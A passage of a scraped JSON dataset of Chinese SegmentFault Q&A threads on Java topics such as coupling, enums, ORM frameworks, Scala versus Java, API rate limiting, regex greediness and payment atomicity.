data-id=\"1020000002423066\">\n<p>不要一棒子把“耦合”削死。<strong>耦合</strong>是一个宽泛的概念。两个程序模块有关联就叫做<strong>耦合</strong>。</p>\n<p>某些模块必然要关联起来才能工作，这是由业务逻辑决定的，不能否认。所以<strong>解耦</strong>并不是字面意义上的把关联拆掉，而是把模块之间的关联放松到必要的程度。一些建议：</p>\n<ul>\n<li>模块只对外暴露最小限度的接口，形成最低的依赖关系。</li>\n<li>只要对外接口不变，模块内部的修改，就不得影响其他模块；</li>\n<li>删除一个模块，应当只影响有依赖关系的其他模块，而不应该影响其他无关部分；</li>\n</ul>\n<p>软件工程有一条铁律“<strong>高内聚、低耦合</strong>”就是这个道理：必要的耦合不可否认，没有耦合程序就做不成事；但是不必要的紧耦合，就会让程序“牵一发而动全身”，最终让程序员的编写和维护都无从下手。</p>\n<p><strong>人类同一时间只能专注于一小部分的内容</strong>。“高内聚、低耦合”就是为了满足人类的这个特点——小尺度上只专注一个模块，局部的编码工作才能够进行。大尺度上把具体代码转化为一些抽象的“模块”和“依赖关系”，才能够抓大放小，把握住程序的脉络，拼合出一个完整的产品。</p>\n<p>想象一下“社会大分工”这个模型——每一个小单位只专注自己的业务部分，与其他单位只存在业务外包的关联，以及物质、信息的交互。事实已经证明：这样的模型比以前大国企“大包大揽”自办各种职能部门的效率，有量级程度的提高。这就是“高内聚、低耦合”在现实世界中的体现。</p>\n<p><strong>程序就是人类创造的第二世界，程序的逻辑无非是世界运行规律的抽象。</strong>跳出程序看程序，就会发现不一样的观点和角度。</p>\n</div>",
      "attention": "17",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002421856\">\n<p>看《thinking in java》和《head first 设计模式》中，两本书好多次提到了“耦合性”和“解耦合性”这两个词。一直以来都是模棱两可的，搜了一下，维基百科中的解释太专业化了，我没有看懂，通俗的讲这两个词是什么意思？</p>\n<hr>\n<p>谢谢大家的回答. 通过大家的回答, 我对于这两个概念有了初步的了解, 但是估计是我的层次不够吧, 看这两本书还是有难度,而且在实际自己编写代码的时候还是不能很好的运用设计模式的精髓, 不过我会努力的,谢谢大家</p>\n</hr></div>",
      "favourite": "11",
      "glance": "9.4k",
      "tags": [
        "计算机科学",
        "java"
      ],
      "time": "2014-12-12",
      "title": "软件工程中的耦合性和解耦合性是什么意思?",
      "url": "https://segmentfault.com/q/1010000002421856"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000306839\">\n<p>先上一段能编译通过的程序：</p>\n<pre><code>enum Direction {\n    EAST,\n    WEST,\n    SOUTH,\n    NORTH;\n}\n\npublic class SimpleEnum {\n    public static void main(String args[]){\n        Direction d = Direction.EAST;\n        switch(d) {\n        case EAST:\n            System.out.println(\"Dragon\");\n            break;\n        case WEST:\n            System.out.println(\"Tiger\");\n            break;\n        case SOUTH:\n            System.out.println(\"Peacock\");\n            break;\n        case NORTH:\n            System.out.println(\"Tortoise\");\n        }\n    }\n}\n</code></pre>\n<p>我的疑问是： <em>为什么程序中对 enum 常量的引用不一致？</em></p>\n<p>在 <code>main</code>函数中，</p>\n<pre><code>Direction d = Direction.EAST;\n</code></pre>\n<p>如果写成</p>\n<pre><code>Direction d = EAST;\n</code></pre>\n<p>javac 会报错，说找不到符号 <code>EAST</code>.</p>\n<p>而switch case的代码块中必须直接跟枚举常量，\n如果把 <code>case EAST:</code> 改成 <code>case Direction.EAST:</code>，\njavac 会报告说： 枚举 switch case 标签必须为枚举常量的非限定名称。</p>\n<p>这种形式的不一致让人有些不爽。为什么会有这种不一致呢？</p>\n</div>",
      "favourite": "5",
      "glance": "6.4k",
      "tags": [
        "java"
      ],
      "time": "2013-09-11",
      "title": "关于java枚举类型的疑问",
      "url": "https://segmentfault.com/q/1010000000306839"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000400297\">\n<p>直接上！可以使用这个Java轻量级框架：<a href=\"http://www.playframework.com/\" rel=\"nofollow\">http://www.playframework.com/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000400113\">\n<p>我在这里也答过：<a href=\"http://segmentfault.com/q/1010000000364063#a-1020000000364524\" rel=\"nofollow\">http://segmentfault.com/q/1010000000364063#a-1020000000364524</a></p>\n<p>看问题的规模。毕设应该比较简单，推荐使用最原始的 Servlet API + 手写 <a href=\"http://segmentfault.com/q/1010000000338283\" rel=\"nofollow\">web.xml</a> + 最原始的 jsp + JDBC 上只有一层薄封装的 commons-dbutils 。</p>\n<p>复杂点的推荐一个轻量级框架 <a href=\"http://www.sparkjava.com/\" rel=\"nofollow\">Spark</a> 。</p>\n<p>构建工具 Maven 几乎必用。主要是你要用它管理第三方库及其依赖。比如如果你的项目使用了 <a href=\"http://search.maven.org/#artifactdetails%7Ccommons-dbutils%7Ccommons-dbutils%7C1.5%7Cjar\" rel=\"nofollow\">commons-dbutils</a> ，你只需要在 pom.xml 中加入：</p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;commons-dbutils&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-dbutils&lt;/artifactId&gt;\n    &lt;version&gt;1.5&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>就行了。不需要向版本控制签入任何第三方库的二进制文件或代码文件。</p>\n<p>IDE：eclipse 或 IntelliJ Idea</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000400101\">\n<p>好吧我来给甲鱼捧个场。。<br>\n我以前是做Java Web的，路线如下，给个参考：<br><code>JSP -&gt; Servlet -&gt; Java SSH Framework</code><br>\n其中SSH我只学了Hibernate，就去搞别的了，所以只涉及到一些简单的MVC、设计模式、ORM之类的，当时我做一些简单的MIS系统是够用了。</br></br></br></p>\n<p>单独说一下<code>Java RESTful</code>，可以用<code>Spring3</code>去搞，也可以用其他的基于<code>JSR 311</code>实现的REST框架。</p>\n<p>Web Container方面，一般Tomcat就够用了，要是想上JBoss也随意。。。这方面有本书<a href=\"http://book.douban.com/subject/3059114/\" rel=\"nofollow\">《JBoss in Action》</a>。</p>\n<p>做毕业设计的话，你觉得网上一些教学视频行不？比如传智播客的Java Web开发。其实我觉得用<strong>入门书 + 文档+Github Demo + 问答社区</strong>这样去边学边做也能达到不错的效果。</p>\n<p><em>好像说了一堆废话&gt;_&lt; 我是来捧场的~</em></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000400073\">\n<p>帮朋友写毕设，用java web完成一些curd的功能，我有php原生基础和一点框架基础，以前学过点java ee什么的。网上有 什么比较好的快速上手的教程么？<br><del>java黑表示目前eclipse都不怎么会用</del></br></p>\n</div>",
      "favourite": "9",
      "glance": "7k",
      "tags": [
        "java",
        "java-web",
        "php",
        "mysql"
      ],
      "time": "2014-01-27",
      "title": "如何快速上手java web",
      "url": "https://segmentfault.com/q/1010000000400073"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000672145\">\n<p>相对于Java而言，Scala的代码更为精简（减低犯错），而且功能更为广泛（Scala其实是Scalable Language 的简称，意为可扩展的语言），许多Scala的特性和语法都是针对Java的不足和弱点来设计的。</p>\n<p>Scala的特点是有很多函数程式语言的特性（例如ML，Miranda, Scheme，Haskell），譬如惰性求值，list comprehension, type inference, anonymous function, pattern matching 等等，同时也包含 Object-Oriented 的特性（OO 能与 FP 混合使用是 Scala 的亮点）。此外，许多相似于高级编程语言的语法也渗入其中（例如 Python），不仅提高了 Scala 代码的可读性，维护、修改起来也较为省时省力。</p>\n<p>Scala 与 Java 语法上的明显差异有：</p>\n<ol>\n<li>不需要分号结尾</li>\n<li>类型定义开头需大写（与 Haskell 相同）</li>\n<li>函数定义需 <code>def</code> 开头（与 Python、Ruby 相同）</li>\n<li>\n<code>return</code> 可以省略</li>\n</ol>\n<p>在此值得提醒的是，统计显示，Scala 的代码运行速率仅为 Java 的 8 成。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000671860\">\n<p>功能多啊，语法复杂啊，号称是JVM上的C++啊，话说搞Java的你不多学几个JVM上的语言都不好意思出门啊！什么？你说JRuby？这种渣脚本你也好意思拿出来说事？Groovy？丫不就一批处理么？BeanShell？丫还不如批处理呢？Clojure……好吧这个逼格比Scala高…………</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000680910\">\n<p>个人觉得比较运行速度其实没啥意义, 因为两种语言都是生成 JVM 的字节码, 依赖 JVM 这个虚拟平台来跑代码. 除非 Scalac (scala的编译器) 有重大 bug, 生成的字节码执行让人无法接受, 否则基本上不会相差太多. 再说, scala 都到大版本2了, 这种概率实在是不大.</p>\n<p>相比较与 Java, 在下觉得 Scala 最主要的有以下两点优势:</p>\n<ul>\n<li><p>FP 泛型支持<br/>\n如果用多了 Spring 中大量的 template 接口, 你就会觉得 FP 其实还是蛮好用的.<br/>\n而这仅仅是 FP 好处的冰山一角.<br/>\n函数其实就是一个 <code>input -&gt; output</code> (scala 也是这么表示一个函数的), 没有任何副作用, 与状态无关, 由于这种特性, 所以函数式的编程范式在分布式领域有很多好处<br/>\n对于函数式编程,我的知识实在是皮毛, 但可以这么说, FP 相对与 OO 有哪些优势, Scala 对于 Java 差不多就有哪些优势.<br/>\n正因为 FP 有如此多的优势, 所以 Java8 才引入了 FP. 从某种程度上来说, Java 认可了 Scala 的做法.</p></li>\n<li><p>类型系统支持<br/>\n如果说 Java 是一种类型安全的语言, 那么毫无疑问, Scala 的类型更加安全, 从某种程度上说, Scala 的类型是图灵完备的, 而 Java 不是. 我的一位好朋友在这方面研究的比较深( <a href=\"http://hongjiang.info/scala/\" rel=\"nofollow\">http://hongjiang.info/scala/</a> ), 而我对与 Scala 的类型系统的理解, 也还是皮毛.</p></li>\n</ul>\n<p>正是以上这两点大优势, 造成了 Scala 比 Java 更加安全, 同时又具备灵活性, 想象力.</p>\n<ul>\n<li><p>其他语言层面上的优势<br/>\n在 Java 中, 你是否有时很想继承多个 <code>AbstractClass</code> 呢? 对不起, Java 只支持单继承<br/>\n在 Scala 中, 你可以进行 mixin (Java 8 也开始引入 default method 了呢)</p>\n<p>在 Java 中, 想要一个 singleton ? 要么在 static block 中做, 要么利用 Enum 的单例特性完成, 或者其他更纠结的方法.<br/>\n在 Scala 中, 只要声明为 <code>object</code>, 即为单例.</p>\n<p>在 Java 中, 想要延迟加载一个单例? <code>double check</code>吧<br/>\n在 Scala 中, 只要在 <code>object</code> 中将变量修饰为 <code>lazy</code> 即可</p>\n<p>在 Java 中, 想要对集合进行一些操作? 使用一层一层的 for 循环吧<br/>\n在 Scala 中, 使用 collection 的一些集合操作, 即可获得如写<code>SQL</code>般的享受.</p>\n<p>在 Java 中, 在并发中想对<code>Future</code>进行回调? 对不起, <code>Future</code> 不是 Listenable (无法支持回调), 除非你使用额外的工具(如 guava, spring)<br/>\n在 Scala 中, 本来就主张异步编程, future 和 promise 的配合让人非常愉快.</p>\n<p>在 Java 中, 要透明扩展一个第三方库的类怎么办? 包装, 再加一层.<br/>\n在 Scala 中, 有强大的 implicit 机制让你更优雅的做到这一点, 同时还能保证类型安全(比起 Ruby 的 monkey patch, 要安全得多)</p></li>\n<li><p>Scala 的表达力很强, 相同功能的代码, 用 Java 和 Scala 的行数不可同日而语.</p></li>\n</ul>\n<p>这些单单是语言层面上的优势, 除此之外, Scala 还能无缝结合 Java</p>\n<p>尽管罗列了如此多的好处, 但 Scala 有如下劣势:</p>\n<ul>\n<li>语法复杂, 学习曲线非常高</li>\n<li>国内 Scala 程序员很难找 (目前 Scala 的影响力也在缓慢扩大, 比如 Scala 社区中的明星 Spark 的流行也在慢慢拉动 Scala 的流行, 如同 rails 之于 ruby)</li>\n<li>社区, 生态还比较小, Scala 风格的库还非常少(但可以和 Java 很容易的斜街很多时候弥补了这一点)</li>\n</ul>\n<p>对于程序员来说: Scala 很难学, 但值得学<br/>\n对于企业来说: Scala 是过滤优秀(好学)程序员(Geek)的好滤斗.</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000671822\">\n<p>如题，还是说两个侧重点不同？如果是，希望大神能指点一下。</p>\n</div>",
      "favourite": "7",
      "glance": "14.7k",
      "tags": [
        "scala",
        "java"
      ],
      "time": "2014-09-16",
      "title": "Scala 相比于 Java 的优势在哪里？",
      "url": "https://segmentfault.com/q/1010000000671822"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000702348\">\n<p>用SpringJdbc吧，比hibernate灵活，真不知道ibatis有什么好的，他的功能SpringJdbc都能实现。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000702373\">\n<p>上面的hibernate,mybatis都太重量级了。</p>\n<p>你可以看下nutz，一站式解决。非常轻便。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000680577\">\n<p>hibernate和ibtas(mybatis)是为了解决不同问题而出现的。</p>\n<p>hibernate是从对象的角度去看数据库，所有数据库层面的表在hibernate看来都是一个个对象，若是对象自然就有一对多，一对一等等关系。hibernate在对象层面完全封装了数据库层面的操作。所以它是一完整的ORM工具。最大的好处就是开发人员能通过很少的代码量就完成数据库层面的操作，大大提示了开发效率，不需要去写很多JDBC代码。</p>\n<p>但是数据库毕竟不能只当做对象来看来，它有自己的组织方式，有自己的索引机制，当你数据库量到一定程度的时候，hibernate就会相当吃力，因为当通过对象的方式来组织对象之间的关系，就会导致映射到数据库层面的SQL会非常的复杂。</p>\n<p>恰恰这种复杂并不是数据库执行引擎所期待的时候，就会导致各种慢查询，故后来出现了ibtas(mybatis)这种半自动化的方式来解决性能问题。同数据库层面的交互还是通过具体的SQL，但是提供了一种机制来简化开发的工作量，也就是写JDBC的工作。</p>\n<p>现在的主流基本还是ibtas(mybatis)，特别是对于互联网应用来说，hibernate太过重了！</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000680531\">\n<p>很久没做java后台了，都不知道java发展的怎么样了。<br/>\n现在ORM框架主流还是hibernate嘛，</p>\n<p>ibtais和mybatis哪个用的多点。请大牛指点<br/>\n补充:mybatis是ibatis的升级，是不是说明ibatis被淘汰了，我司好像还是用ibtais,我想从这两个中选择一个学习，大神们请推荐。</p>\n</div>",
      "favourite": "4",
      "glance": "9k",
      "tags": [
        "java",
        "orm"
      ],
      "time": "2014-09-18",
      "title": "java中的orm框架",
      "url": "https://segmentfault.com/q/1010000000680531"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002942744\">\n<p>为每个secret维护一个长度为100的队列<br>\n当队列长度为100的时候，取出队列头<br>\n判断时间是否超过1分钟，则accept<br>\n如果不足1分钟则deny<br>\n然后shift和push队列即可</br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002995692\">\n<p>这个呢？<br>\nRedis 与网络流量整形<br><a href=\"http://blog.jobbole.com/88064/\" rel=\"nofollow\">http://blog.jobbole.com/88064/</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002950771\">\n<html><body><p>nginx的limit_req_zone就符合你想要的这种需求,它是使用令牌桶算法的.具体你可以看一下.<img data-src=\"/img/bVmyfo\"/></p></body></html>\n</div>",
      "attention": "42",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002938194\">\n<h2>如何限制接口调用者对接口的调用频率？</h2>\n<h3>问题:对某个对外暴露的接口加一个限制:调用者一分钟之内调用次数不能超过100次,如果超过100次就直接返回给调用者失败的信息。</h3>\n<ul>\n<li>给调用者一个SECRET，每次调用者需要调用接口的时候,都需要把这个SECRET带过来(为了安全需要对key进行一系列加密的措施)</li>\n<li>一个SECRET就代表一个调用者,把相应的SECRET的调用次数放入缓存中(必须确保次数增加的原子性)，并且把SECRET当做缓存的SECRET(这里如果区分方法的话,可以把方法和KEY做一次加密）。</li>\n</ul>\n<p>这里主要的难点就是,如何判断调用者1分钟之内调用次数是否超过100？也就是很难确实这个1分钟的开始时间。</p>\n<p>我现在的想法是:分别把当前秒调用的次数存入缓存。比如说,当前调用者调用次数为3,那么我就往缓存中加入KEY=SECRET_1,VALUE=3;然后调用者在第二秒调用的次数为4，那么就往缓存中加入KEY=SECRET_2,VALUE=3;如此循环,当循环到61秒的时候替换KEY=SECRET_1中得VAALUE,每次调用的时候计算SECRET_1~SECRET_60的值来判断调用次数,是否超过100次。(这里具体一秒钟调用几次,需要通过时间戳来算出是第几秒。这里以60秒为时间周期,并且以秒为一个时间单位,当然如果要求不是很准确的话,时间单位可以调大一点)</p>\n<p><em>问题</em> 请问有没有别的更好方法或者想法可以实现这个调用频率的限制？</p>\n</div>",
      "favourite": "27",
      "glance": "6.1k",
      "tags": [
        "接口设计",
        "java",
        "php",
        "python",
        "程序设计"
      ],
      "time": "2015-06-27",
      "title": "怎么保证对外暴露接口的安全性(调用频率限制)",
      "url": "https://segmentfault.com/q/1010000002938194"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004507852\">\n<p>试试这个RAP, 简单易用。部署后在线浏览，包含权限控制与接口文档的版本控制。<br><a href=\"http://rap.taobao.org/org/index.do\"></a><a href=\"http://rap.taobao.org/org/index.do\">http://rap.taobao.org/org/index.do</a></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004504991\">\n<p>有个开源的接口管理工具   <a href=\"http://git.oschina.net/leunpha/apiManager\">http://git.oschina.net/leunpha/apiManager</a>   还不错  可以试试</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004507740\">\n<p>最好的API文档管理工具 <a href=\"http://swagger.io/\">http://swagger.io/</a> 不多说了，官方文档很全，自个研究吧</p>\n</div>",
      "attention": "24",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004504951\">\n<blockquote><p>开发restful接口，需要和IOS,Android对接。<br>刚开始是Git直接是上文档，现在接口越来越多，难管理、难验证、难查询<br>想找达到以下目的的工具</br></br></p></blockquote>\n<p>1、管理接口地址、请求方法、携带参数，接口版本，说明。<br>2、模拟请求类似POSTMAN<br>3、批量完成一组（多个规定的接口）请求<br>4、能扩展，例如将用户整合进来。</br></br></br></p>\n<p>如果有那用现有轮子，更方便。<br>如果没有那就只能造了一个了（其实还是不喜欢造！）</br></p>\n</div>",
      "favourite": "15",
      "glance": "1.3k",
      "tags": [
        "php",
        "golang",
        "node.js",
        "python",
        "java"
      ],
      "time": "2-28",
      "title": "有什么好的接口管理工具吗？",
      "url": "https://segmentfault.com/q/1010000004504951"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000262597\">\n<ul>\n<li>不用自己驾驭不了的技术。</li>\n<li>不用太新的、不成熟的技术。</li>\n<li>不用社区不活跃的技术（遇到问题解决不了）。</li>\n<li>不要为了框架而框架。</li>\n</ul>\n<p>综上：SSH。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000175509\">\n<p>Java本身就是带着镣铐的跳舞。<br/>\n学习Struts可能比较痛苦。<br/>\n但是我可以告诉你，<a href=\"http://www.springsource.org\" rel=\"nofollow\" target=\"_blank\" title=\"Spring\">Spring</a>会比它更复杂。</p><p>所以学习Struts是Java EE的必备课程。<br/>\n不过我个人现在对Java EE不是很看好，反而对Android开发比较有兴趣。所以其他的框架我就不熟悉了。比如<a href=\"http://www.playframework.com/\" rel=\"nofollow\" target=\"_blank\" title=\"Play Framework\">Play Framework</a>之类的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000262466\">\n<p>你可以听听下面这个故事，在此借用迅哥儿的一句话： </p>\n<blockquote>\n<p>这个世界上本没有路，走的人多了，于是便成了路...</p>\n</blockquote>\n<ol>\n<li>框架不是一开始就有的。在java web开发的世界里，最开始就只有一个可用的servlet API，你要开发web应用，就只能靠它了；</li>\n<li>就单单这个简陋的API，开发起来，实在是捉襟见肘。于是在一个个前赴后继的'先烈'往这个坑里跳的同时，一部分人实在看不下去了，于是便有了所谓的框架。其实这个时候的所谓框架就是个框框，帮你解决了一部分的工作，可是还是很难用，更别谈什么解耦、扩展，吧啦吧啦滴；</li>\n<li>MVC童鞋最开始对于Web开发者而言还不一定混的很熟，它也就是一个设计模式而已。突然某一天，某个大神发现这个东西用在Web开发上真是物尽其用啊，很好地解耦了web请求过程中的数据、业务逻辑和信息展示，而且很好地提供了各个部分的扩展性。概括起来，就是说它妙不妙，谁用谁知道啊！，这个时候，MVC与Web开发的关系迅速进入蜜月期，作为一个web开发者，聊天的时候，你都不好意思说不知道MVC。于是，各种web开发的MVC框架雨后春笋般的，往外冒...这个时期，struts是java世界中最被广大web开发者接受的大众情人了。</li>\n<li>差不多与此同时，javaEE的世界还有另一个大众情人，那就是EJB了。不过她仗着大家对她的宠爱，越来越啰嗦、拖沓，养成了不少的坏毛病。此时一个牛X哄哄的家伙看不爽了，捧出了另一个新人-spring。这个家伙的横空出世，让java世界的小伙伴们惊呆了，他是那样的清纯、优雅，令人着迷。于是，过不了一些时间，spring逐渐超越了EJB，成了java世界当之无愧的No.1大众情人了。毫无疑问，它对web开发者展现了她独有的，性感的一面-spring MVC。</li>\n<li>spring尽管光环无比闪耀，spring MVC拥有对web开发者独有的吸引力，但她为了扩大自己的魅力，同时与struts等老的大众情人交好，提供友好的扩展。毕竟每个web开发者对于web MVC框架都有自己的心头好，每个web MVC框架也拥有自己的粉丝。此时，在Web MVC框架的领地基本是百花争放，百家争鸣了。</li>\n<li>没有不老的神话，也没有绝对的大众情人。在spring大行其道的今天，她为了吸引更多的粉丝，给自己的套上了一件又一件华丽的外衣，以期满足所有web开发屌丝对女神的所有幻想。这样，之前的一些粉丝，觉得spring失去了其最初的纯粹，连带spring MVC也慢慢地不是那么有吸引力了。这个时候，一些最开始的粉丝，开始转移目标，以spring为原型或者依托，捧红了像play framework、JFinal等一些小清新了。</li>\n<li>日子总是会一直过下去的，web开发这个世界变的太快了，也许再过几年，spring这个大众情人就过气了，总会有新人出来的。这个故事的结尾，续上迅哥儿的那句话：同样是那条路，走的人多了，就踩烂了，也许又会慢慢回归荒芜了。</li>\n</ol>\n<p>PS：前面，只是本人作为java web开发世界中一枚屌丝的小小追随足迹。现在回过头来看：<br/>\n<strong>所谓的框架，只是帮你完成一些基础，琐碎工作的工具，使你能够更好的关注自己的业务逻辑。不要本木倒置，为了框架而框架。对于一个新的项目，如果时间充足，你可以好好了解，仔细选型；如果时间不允许，果断选择自己最熟悉，最信得过的上...</strong></p>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000175446\">\n<p>感觉struts是不是有些复杂了，<br/>\n一般选择的是什么方式</p>\n</div>",
      "favourite": "10",
      "glance": "30.8k",
      "tags": [
        "java-ee",
        "java"
      ],
      "time": "2013-03-03",
      "title": "java开发web现在一般用什么mvc框架？",
      "url": "https://segmentfault.com/q/1010000000175446"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000259536\">\n<p>原标题:问一个正则表达式相关的问题.\n\"pageUrl\":\"([\\S]+)\",\"name\n用上面的匹配如下:\n得到的是\"pageUrl\":\"test1\",\"name\":\"test1\",\"pageUrl\":\"test2</p>\n<p>但我想得到的是test1怎么能让它碰到第一个\",\"name就停止呢?</p>\n<p><strong>----------------------------------分割线----------------------------------</strong>\n上面的是问题的原样,得到答案后,梳理一下文字,以尽可能的更容易被不知道的搜索到.</p>\n<p>贪婪匹配:在满足匹配条件时,匹配尽可能长的字符串,在匹配中,默认为贪婪匹配.</p>\n<pre><code>string pattern1 = @\"a.*c\";   // greedy match \nRegex regex = new Regex(pattern1);\nregex.Match(\"abcabc\"); // return \"abcabc\"\n</code></pre>\n<p>非贪婪匹配:在满足匹配条件时,匹配尽可能短的字符串,使用?来表示非贪婪匹配</p>\n<pre><code>string pattern1 = @\"a.*?c\";   // non-greedy match \nRegex regex = new Regex(pattern1);\nregex.Match(\"abcabc\"); // return \"abc\"\n</code></pre>\n<p>以上内容来自:@zdd的博客,文章地址:\n<a href=\"http://www.cnblogs.com/graphics/archive/2010/06/02/1749707.html\" rel=\"nofollow\">正则表达式-问号的四种用法</a></p>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "java",
        "正则表达式"
      ],
      "time": "2013-07-30",
      "title": "正则表达式中,得到的结果长度大于预期的结果长度.即:非贪婪匹配",
      "url": "https://segmentfault.com/q/1010000000259536"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000302691\">\n<p>偶尔发现了一段好玩的java代码，关于Java内部类的，觉得很有意思，但是想不明白这段代码是java语法的特性哪？还是别的什么。哪位能给我解释一下哪~~</p>\n<pre><code class=\"lang-java\">\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Main {\n\n    public static void main(String[] args) {\n        List&lt;String&gt; lst = new ArrayList&lt;String&gt;() {\n            @Override\n            public boolean add(String paramE) {\n                return super.add(\"LST-\" + paramE);\n            }\n\n            {\n                add(\"RMB\");\n                add(\"USD\");\n                add(\"AUS\");\n            }\n        };\n\n        for (String str : lst) {\n            System.out.println(str);\n        }\n    }\n}\n\n</code></pre>\n<p>多谢@brayden的解答，查看了JL定义中的Instance Initializers，了解到这个是Java语法标准。顺便我反编译了一下，生成的代码，下面这段匿名方法最终会编译到这个内部类的构造函数中。</p>\n<pre><code class=\"lang-java\">{\n    add(\"RMB\");\n    add(\"USD\");\n    add(\"AUS\");\n}\n</code></pre>\n<p>反编译后的代码：\n<strong>Main</strong></p>\n<pre><code class=\"lang-java\">import java.io.PrintStream;\nimport java.util.ArrayList;\n\npublic class Main\n{\n  public static void main(String[] paramArrayOfString)\n  {\n    ArrayList local1 = new ArrayList()\n    {\n      public boolean add(String paramAnonymousString) {\n        return super.add(\"LST-\" + paramAnonymousString);\n      }\n    };\n    for (String str : local1)\n      System.out.println(str);\n  }\n}\n</code></pre>\n<p><strong>Main$1内部类</strong></p>\n<pre><code class=\"lang-java\">import java.util.ArrayList;\n\nfinal class Main$1 extends ArrayList&lt;String&gt;\n{\n  Main$1()\n  {\n    add(\"a\");\n    add(\"45\");\n    add(\"a\");\n    add(\"asdfs\");\n  }\n\n  public boolean add(String paramString)\n  {\n    return super.add(\"LST-\" + paramString);\n  }\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "java",
        "jvm",
        "内部类"
      ],
      "time": "2013-09-02",
      "title": "有人可以帮我解释一下这段java内部类的代码吗",
      "url": "https://segmentfault.com/q/1010000000302691"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000314434\">\n<h3>案例1，</h3>\n<p>客户下订单后，订单总额100RMB；\n客户点击支付后，支付系统收到请求，从客户账户扣除100RMB，订单状态修改为已支付，通知商品出库系统等一系列工作后，最后返回正确状态给客户，这样基本完成支付工作。</p>\n<p>在此，如何在突发情况下，保证支付完成或者支付失败。</p>\n<p>这些突发情况应该包括：</p>\n<ol>\n<li>客户请求不可到达</li>\n<li>账户扣款后，没有通知出库</li>\n<li>状态返回之前，系统宕机</li>\n</ol>\n<h3>案例2</h3>\n<p>客户点击支付后，又使用系统的购物卡（或者现金卡等），用虚拟币替代部分支付款；</p>\n<p>这里增加了一点复杂度：\n在虚拟币扣除后突然宕机（只是其中一个原因，实际情况下可能会有其他的奇葩事件），现金款没有被扣除，客户也没有获得返回状态，这个时候客户发现虚拟货币少了，但是订单还是未支付。</p>\n<p>不好意思，我不是做电子商务的同学，提不出其他的深奥问题了。</p>\n<p>对于案例出现的情况， 我先提出我的解决方案：</p>\n<p>要想解决这些问题，我会要设计一套日志系统来记录每步的操作和涉及到的数据，这个系统单独运行在一个单独的硬件环境下面，宕机恢复瞬间（也就是系统提供服务之前）查询日志，日志返回最后失败的业务（注意是业务，不是具体的某个操作，因为支付是一系列的流程，不能用单独的某个操作去表示）用来恢复数据。</p>\n<p>那么我的问题是，</p>\n<p>1.如何设计系统来保证支付的原子性。</p>\n<p>2.有开源系统可以来借鉴吗？</p>\n<p>先谢谢大牛！</p>\n</div>",
      "favourite": "7",
      "glance": "2.1k",
      "tags": [
        "电子商务网站",
        "网上支付",
        "java"
      ],
      "time": "2013-09-29",
      "title": "电商系统如何保证支付的原子性",
      "url": "https://segmentfault.com/q/1010000000314434"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000314734\">\n<p>以前看过一篇NIO文章还不错，<a href=\"http://www.ibm.com/developerworks/cn/education/java/j-nio/\" rel=\"nofollow\"><a href=\"http://www.ibm.com/developerworks/cn/education/java/j-nio/\" rel=\"nofollow\">http://www.ibm.com/developerworks/cn/education/java/j-nio/</a></a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000361613\">\n<p>nio 少了一次从 内核空间 到 用户空间的 copy.</p>\n</div>",
